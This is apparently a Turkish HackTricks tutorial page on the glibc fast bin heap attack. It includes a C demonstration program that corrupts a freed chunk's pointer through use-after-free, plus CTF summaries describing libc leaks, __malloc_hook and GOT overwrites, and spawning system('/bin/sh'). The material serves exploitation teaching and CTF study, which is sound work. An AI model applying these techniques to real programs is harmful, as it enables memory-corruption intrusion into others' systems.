# Hızlı Bin Saldırısı

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Hızlı bin nedir hakkında daha fazla bilgi için bu sayfaya bakın:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

Hızlı bin tek yönlü bir bağlı liste olduğundan, diğer binalardan çok daha az korumaya sahiptir ve sadece **bir serbest bırakılan hızlı bin parçasındaki bir adresi değiştirmek**, daha sonra **herhangi bir bellek adresinde bir parça ayırmak için yeterlidir**.

Özetle:

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

Çok iyi açıklanmış bir kod içeren tam bir örneği [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html) adresinden bulabilirsiniz:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
Eğer global değişken **`global_max_fast`**'in değeri büyük bir sayıyla üzerine yazılabilirse, bu daha büyük boyutlarda hızlı bin parçaları oluşturmayı mümkün kılar, bu da önceden mümkün olmayan senaryolarda hızlı bin saldırıları gerçekleştirmeye olanak tanır. Bu durum [büyük bin saldırısı](large-bin-attack.md) ve [sıralanmamış bin saldırısı](unsorted-bin-attack.md) bağlamında kullanışlıdır.
{% endhint %}

## Örnekler

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* Parçalar tahsis edilebilir, serbest bırakılabilir, içerikleri okunabilir ve doldurulabilir (bir taşma güvenlik açığı ile).
* **Bilgi sızdırma için parça birleştirme**: Tekniğin temelinde taşmayı kötüye kullanarak sahte bir `prev_size` oluşturmak vardır, böylece bir önceki parçalar daha büyük bir parçanın içine yerleştirilir, bu nedenle başka bir parça serbest bırakıldığında, içinde başka bir parça bulunan daha büyük bir parça tahsis edildiğinde, verileri yazdırmak ve libc (`main_arena+88`) adresini sızdırmak mümkün olur.
* **Malloc hook üzerine yazma**: Bunun için ve önceki örtüşme durumunu kötüye kullanarak, aynı belleğe işaret eden 2 parçaya sahip olmak mümkündü. Dolayısıyla, bunları ikisini de serbest bırakarak (korumaları atlamak için araya başka bir parça serbest bırakarak), aynı parçayı hızlı binde 2 kez elde etmek mümkün olmuştur. Sonra, tekrar tahsis edilmesi, bir sonraki parçanın adresini `__malloc_hook`'un biraz öncesine işaret edecek şekilde üzerine yazması (böylece malloc'un bir boş boyut olarak düşündüğü bir tamsayıya işaret etmesi - başka bir atlatma), bunu tekrar tahsis etmesi ve ardından malloc hook adreslerini alacak başka bir parça tahsis etmesi mümkün olmuştur.\
Son olarak bir **tek araç** oraya yazılmıştır.
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* Bir parça serbest bırakıldığında, işaretçilerin tekrar kullanılabilir ve tekrar serbest bırakılabilir olması nedeniyle bir bellek taşması ve kullanımdan sonra serbest bırakma ve çift serbest bırakma vardır.
* **Libc bilgi sızıntısı**: Sadece bazı parçaları serbest bırakın ve bunlar ana arena konumunun bir kısmına bir işaretçi alacak şekilde olacaktır. Serbest bırakılan işaretçileri tekrar kullanabileceğinizden, bu adresi okuyun.
* **Hızlı bin saldırısı**: Tahsis edilen tüm parçaların işaretçileri bir dizi içinde depolanır, bu nedenle birkaç hızlı bin parçasını serbest bırakabilir ve en sonuncusunda adresi bu işaretçi dizisinin biraz öncesine işaret edecek şekilde üzerine yazabiliriz. Sonra, aynı boyutta birkaç parça tahsis ederiz ve önce meşru olanı ve ardından işaretçi dizisini içeren sahte olanı alırız. Şimdi bu tahsis işaretçilerini üzerine yazabiliriz ve `free`'nin GOT adresini `system`'e işaret etmesini sağlayabiliriz ve ardından chunk 1'e `"/bin/sh"` yazabiliriz ve ardından `free(chunk1)` çağrısını yapabiliriz ki bu da aslında `system("/bin/sh")`'yi çalıştıracaktır.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* Sıralanmamış parçaları birleştirmek ve bir libc bilgi sızıntısı elde etmek için bir bayt taşmasını kötüye kullanma örneği ve ardından malloc hook'u bir tek araç adresiyle üzerine yazmak için hızlı bin saldırısı gerçekleştirme örneği
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* Bir libc adresi ve bir PIE adresi sızdırmak için sıralanmamış parçaları kötüye kullanma ve UAF'ı kötüye kullanma sonrasında, bu CTF'nin sömürüsü, kontrol edilen parçaların bulunduğu bir yere bir parça tahsis etmek için hızlı bin saldırısı kullandı, böylece belirli işaretçileri üzerine yazarak GOT'ta bir tek araç yazmak mümkün oldu
* Bir hızlı bin saldırısının sıralanmamış bir parça saldırısı aracılığıyla kötüye kullanıldığına dikkat edin:
* Hızlı bin saldırıları gerçekleştirmeden önce genellikle libc/bellek adreslerini sızdırmak için serbest listeleri kötüye kullanmak yaygındır (gerektiğinde).
* [**Robot Fabrikası. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)
* Yalnızca `0x100`'den büyük boyutta parçalar tahsis edebiliriz.
* Bir Sıralanmamış Bin saldırısı kullanarak `global_max_fast`'i üzerine yazma (ASLR nedeniyle 1/16 kez çalışır, çünkü 12 biti değiştirmemiz gerekmektedir, ancak 16 biti değiştirmemiz gerekmektedir).
* Global bir parça dizisini değiştirmek için Hızlı Bin saldırısı. Bu, GOT'u değiştirmeye ve bazı işlevleri `system`'e işaret etmeye olanak tanıyan bir keyfi okuma/yazma ilkesi sağlar.

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı takip edin.
* Hacking hilelerinizi göndererek **HackTricks** ve **HackTricks Cloud** github depolarına PR'lar göndererek paylaşın.

</details>
